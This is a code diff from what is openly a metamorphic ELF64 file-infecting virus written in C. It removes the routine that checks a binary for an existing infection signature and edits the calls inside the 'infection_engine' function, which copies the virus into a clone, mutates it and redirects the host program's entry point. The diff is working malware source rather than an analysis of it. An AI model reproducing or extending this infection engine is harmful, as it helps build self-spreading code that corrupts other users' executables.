@@ -3,26 +3,6 @@
 #include "errors.h"
 #include "compiler_utils.h"
 
-/*
-** if current binary is already our client, don't infect again ! <3
-*/
-static bool	not_infected(const struct entry *file_entry,
-			struct safe_ptr file_ref, size_t dist_entry_header)
-{
-	const Elf64_Off	sh_offset        = file_entry->safe_shdr->sh_offset;
-	const size_t	entry_offset     = sh_offset + file_entry->offset_in_section;
-	const size_t	signature_offset = entry_offset + dist_entry_header + sizeof(struct virus_header);
-	const char	 *signature      = safe(file_ref, signature_offset, SIGNATURE_LEN);
-
-	if (signature == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);
-
-	if (checksum(signature, SIGNATURE_LEN) == SIGNATURE_CKSUM)
-		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED);
-
-	return true;
-}
-
 static bool	adjust_sizes(struct entry *clone_entry,
 			size_t shift_amount, size_t full_virus_size)
 {
@@ -72,7 +52,7 @@ bool		infection_engine(struct virus_header *vhdr,
 	size_t		*full_virus_size = &vhdr->full_virus_size;              // changed by <metamorph_clone>
 
 	if (!find_entry(&file_entry, file_ref)
-	|| !not_infected(&file_entry, file_ref, vhdr->dist_header_loader)
+	|| !not_infected(&file_entry, file_ref)
 	|| !copy_virus_to_clone(clone_ref, &file_entry, vhdr)
 	|| !generate_seed(seed, file_ref)
 	|| !metamorph_clone(clone_ref, *loader_off, *seed, full_virus_size, vhdr)
@@ -82,7 +62,7 @@ bool		infection_engine(struct virus_header *vhdr,
 	|| !find_entry(&clone_entry, clone_ref)
 	|| !adjust_sizes(&clone_entry, *shift_amount, *full_virus_size)
 	|| !setup_virus_header(clone_ref, *loader_off, *vhdr)
-	|| !change_entry(clone_ref, &file_entry, vhdr->dist_client_loader, seed))
+	|| !change_entry(clone_ref, &file_entry))
 		return errors(ERR_THROW, _ERR_T_INFECTION_ENGINE);
 
 	return true;
